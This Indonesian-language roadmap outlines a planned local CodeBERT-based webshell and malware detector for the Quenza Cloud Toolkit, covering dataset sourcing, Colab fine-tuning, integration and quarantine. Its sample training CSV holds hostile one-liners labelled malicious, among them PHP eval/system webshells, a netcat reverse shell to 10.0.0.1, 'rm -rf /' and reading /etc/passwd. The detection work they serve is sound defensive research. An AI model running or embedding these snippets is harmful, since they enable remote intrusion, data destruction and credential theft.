# Future Roadmap: Quenza Cloud Toolkit

Dokumen ini berisi kumpulan ide dan peta jalan (*roadmap*) pengembangan Quenza Cloud Toolkit di masa depan, yang disusun berdasarkan diskusi dan riset keamanan siber tingkat lanjut.

---

## 1. Local AI Malware Analyst (NGAV & SAST)

### Konsep
Menggantikan ketergantungan pada OpenAI API dengan **Model AI Lokal** (HuggingFace) yang secara khusus dilatih (*fine-tuned*) untuk memahami keamanan kode. Model ini akan bertindak sebagai *Next-Generation Anti-Virus* (NGAV) / *Static Application Security Testing* (SAST) yang berjalan murni di *server* lokal (On-Premise).

### Keuntungan
*   **0 Biaya Operasional:** Tidak ada lagi tagihan token API per *scan*.
*   **Privasi Maksimal:** *Source code* tetap berada di server lokal (tidak dikirim ke server pihak ketiga).
*   **Kecepatan Tinggi:** *Overhead* jaringan hilang karena *inference* (analisis) dilakukan di *localhost*.

### Rencana Eksekusi (Fine-Tuning Workflow)

#### A. Persiapan Dataset
Diperlukan dataset berupa pasangan *source code* dan label bahaya/aman.
*   **Format:** File CSV (`isi_kode`, `label`).
    *   `label = 1` (Malicious / Webshell / Backdoor)
    *   `label = 0` (Safe / Normal Code)
*   **Jumlah (Minimum Viable Product):** ~1.000 sampel virus dan 1.000 sampel kode aman.
*   **Jumlah Ideal:** 5.000 hingga 10.000 per kelas (seimbang 50:50).
*   **Sumber Data (Label 1 - Malicious):** 
    *   Mencari *repository* arsip *webshell* di GitHub (contoh: `tennc/webshell`, `backdoor-shell`, `JohnTroony/php-webshells`).
    *   Mengambil *source code* dari GitHub Gist hasil pencarian *hacker* (seperti pencarian "github php backdoor", "magic include shell", dll).
    *   Mengambil sampel dari basis data *malware* terbuka (seperti *MalwareBazaar* atau *VirusTotal*).
*   **Sumber Data (Label 0 - Safe):** 
    *   Mengunduh *source code* murni dari rilis resmi *framework* (misal: repositori GitHub WordPress, Laravel, CodeIgniter, Express.js).
    *   Skrip-skrip utilitas umum yang ada di GitHub.

#### B. Pemilihan Model (HuggingFace)
Jangan menggunakan *Large Language Model* (LLM) generasi generik karena berat. Gunakan arsitektur *Encoder-only* yang lebih kecil, cepat, dan spesialis untuk membaca konteks teks/kode:
*   `microsoft/codebert-base`
*   `roberta-base`

#### C. Proses Training (Google Colab Gratis)
*Fine-tuning* dapat dilakukan di Google Colab menggunakan GPU Tesla T4 (gratis).
1. Unggah dataset CSV ke Google Drive.
2. Pasang pustaka `transformers` dan `datasets`.
3. Buat skrip *training loop* menggunakan fitur **HuggingFace Trainer**.
4. Ekspor hasil *training* (model `.bin` / `.safetensors` dan *tokenizer*).

#### D. Integrasi ke Quenza
1. Tambahkan dependensi `transformers` atau `onnxruntime` ke *environment* Quenza.
2. Buat *class* adapter baru di `app/services/local_ai_service.py` untuk memuat model lokal.
3. Modifikasi pengaturan UI agar pengguna bisa memilih **"AI Engine: OpenAI (Cloud)"** atau **"AI Engine: CodeBERT (Local)"**.

### E. Alur Kerja (Workflow) AI Lokal
Saat AI Lokal telah terintegrasi penuh, alur kerjanya akan beroperasi dalam 3 tahapan (berjalan murni di memori server tanpa internet):

**1. Tahap Input (Masukan)**
*   Sistem membaca isi mentah (*source code*) dari file yang dicurigai (misal: `config.php`).
*   Teks kode dimasukkan ke **HuggingFace Tokenizer** untuk dipecah dan diterjemahkan menjadi deretan angka matematika (vektor) agar bisa dipahami oleh AI.

**2. Tahap Proses (Inferensi / Analisis)**
*   Vektor angka dimasukkan ke dalam model bahasa lokal (contoh: *CodeBERT*).
*   *Neural Network* melakukan pemahaman secara semantik (*Semantic Understanding*), bukan sekadar mencocokkan kata. AI mencoba mengenali pola pikir/niat terselubung di balik kode tersebut.
*   Model mengkalkulasi probabilitas skor ancaman (contoh: 2% Aman, 98% Virus).

**3. Tahap Output (Keluaran & Tindakan)**
*   Jika skor bahaya melebihi ambang batas (misal > 80%), AI mengeluarkan vonis **Malicious (1)**.
*   Quenza langsung bereaksi dengan memicu fungsi karantina: mengenkripsi file menjadi format ZIP yang terkunci sandi dan memindahkannya ke *vault* isolasi.
*   Log dicatat dan notifikasi darurat (*alert*) dikirimkan ke administrator via Telegram/Email.

### Contoh Struktur Dataset (CSV)
Berikut adalah gambaran fisik (contoh 20 baris pertama) dari dataset berformat CSV yang dibutuhkan untuk *fine-tuning*. Kolom `text` berisi *source code* murni, dan `label` berisi `1` (Virus/Bahaya) atau `0` (Aman).

```csv
text,label
"<?php echo 'Hello World'; ?>",0
"<?php eval(base64_decode($_POST['cmd'])); ?>",1
"function calculateTotal(a, b) { return a + b; }",0
"import os; os.system('nc -e /bin/bash 10.0.0.1 4444')",1
"const express = require('express'); const app = express();",0
"<?php system($_GET['c']); ?>",1
"def get_user(id): return db.query(User).filter(User.id == id).first()",0
"require('child_process').exec('rm -rf /', function(err, stdout, stderr) {});",1
"<html><body><h1>Welcome to our site</h1></body></html>",0
"<script>eval(String.fromCharCode(104,101,108,108,111))</script>",1
"<?php file_put_contents('shell.php', '<?php phpinfo(); ?>'); ?>",1
"class ProductController { public function index() { return view('products'); } }",0
"<?php $z=gzinflate(base64_decode('...')); eval($z); ?>",1
"if __name__ == '__main__': app.run(debug=True)",0
"import pty; pty.spawn('/bin/sh')",1
"var arr = [1, 2, 3]; arr.forEach(item => console.log(item));",0
"<?php passthru('cat /etc/passwd'); ?>",1
"body { font-family: Arial, sans-serif; background-color: #f4f4f4; }",0
"<?php assert($_REQUEST['x']); ?>",1
```
*(Catatan: Saat melatih model, usahakan teks source code-nya bukan cuma 1 baris, melainkan representasi utuh dari sebuah file script).*
